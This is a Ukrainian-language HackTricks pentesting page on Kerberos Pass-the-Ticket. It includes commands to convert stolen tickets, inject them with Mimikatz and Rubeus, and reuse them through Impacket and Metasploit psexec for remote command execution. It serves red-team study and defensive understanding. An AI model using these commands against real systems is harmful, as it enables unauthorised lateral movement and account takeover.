# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Під час атаки Pass-the-Ticket (PtT) зловмисник використовує викрадений квиток Kerberos для автентифікації від імені його принципала, не маючи пароля цього облікового запису. Квиток надання квитків (TGT) можна використовувати для запиту квитків служб, тоді як викрадений квиток служби обмежений цільовою службою та строком дії.<sup>[[1]](#references)</sup>

Щоб дізнатися про методи отримання квитків, див.:

- [Збирання квитків у Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Збирання квитків у Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Перетворення форматів квитків Linux і Windows

Кеші Kerberos у Linux зазвичай мають формат MIT `ccache`, а у Windows — формат `.kirbi`. `ticket_converter` перетворює ці формати, використовуючи вхідний квиток і шлях для вихідного файлу.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo також надає інструменти для роботи з квитками Kerberos у Windows.<sup>[[3]](#references)</sup>

## Використання квитка

У Linux вкажіть кеш у `KRB5CCNAME` і налаштуйте клієнт Impacket на використання Kerberos без запиту пароля:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

У Windows Mimikatz або Rubeus можуть імпортувати квиток `.kirbi` до поточного сеансу входу. Скористайтеся `klist`, щоб переглянути отриманий кеш.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Імпорт ticket не надає привілеїв, що виходять за межі тих, які передбачені самим ticket і політикою авторизації цільового сервісу. Прострочені, відкликані, некоректно сформовані або неправильно обмежені ticket можуть не спрацювати.<sup>[[1]](#references)</sup>

Щоб дізнатися більше про атаки на Kerberos і пов’язані з ними методи отримання ticket, дивіться посібник Tarlogic з атак на Kerberos.<sup>[[7]](#references)</sup>

### Повторне використання зовнішнього ticket у Metasploit

Metasploit автоматично не зчитує `KRB5CCNAME` від Impacket для своїх модулів Kerberos. Передайте модулю **файл ccache** через специфічну для протоколу опцію `::Krb5Ccname`. Задайте `::Rhostname` як SPN hostname цілі, а домен — як домен цілі; `RHOST` і далі може бути IP-адресою цілі. Так можна використати вже отриманий ticket, не вводячи пароль облікового запису.<sup>[[8]](#references)</sup>

За потреби спочатку перетворіть `.kirbi` на ccache.<sup>[[9]](#references)</sup>

Наприклад, якщо у вас є ticket для облікового запису, якому дозволено створювати служби на цілі, запустіть [модуль SMB PsExec](../lateral-movement/psexec-and-winexec.md), використавши цей кеш:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit спочатку вибирає відповідний service ticket із наданого кешу. Якщо знайдено лише TGT, він запитує service ticket у KDC, тому для цього сценарію також потрібне підключення до DC. Кеш, що містить лише service ticket, не надає доступу до інших хостів. Для інших підтримуваних модулів змініть префікс параметра (наприклад, `Winrm::Krb5Ccname` для [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - приклади Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Техніки атак Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Автентифікація служби](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Перетворення файлів kirbi і ccache](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Реалізація Kerberos-клієнта SMB у Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
